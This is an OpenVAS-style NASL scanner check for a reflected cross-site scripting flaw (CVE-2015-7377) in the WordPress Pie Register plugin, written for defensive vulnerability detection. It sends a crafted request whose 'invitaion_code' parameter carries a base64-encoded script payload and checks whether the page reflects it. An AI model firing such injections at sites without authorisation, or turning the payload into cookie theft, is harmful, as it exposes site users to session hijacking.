CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805763" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2015-7377" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-10-20 12:43:41 +0530 (Tue, 20 Oct 2015)" );
	script_name( "WordPress Pie Register Cross-Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wpvulndb.com/vulnerabilities/8212" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133928" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/536668" );
	script_xref( name: "URL", value: "https://github.com/GTSolutions/Pie-Register" );
	script_tag( name: "summary", value: "The host is installed with wordpress
  pie register plugin and is prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaw exists as input passed via the
  'invitaion_code' parameter is not properly sanitized before being returned
   to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a user's browser session
  in context of an affected site." );
	script_tag( name: "affected", value: "WordPress Pie Register version before
  2.0.19." );
	script_tag( name: "solution", value: "Upgrade to Pie Register version 2.0.19 or
  later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = "/?page=pie-register&show_dash_widget=1&invitaion_code=PHNjcmlwdD" + "5hbGVydCgnZG9jdW1lbnQuY29va2llJyk8L3NjcmlwdD4=";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\('document.cookie'\\)</script>", extra_check: ">Activation Code :" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

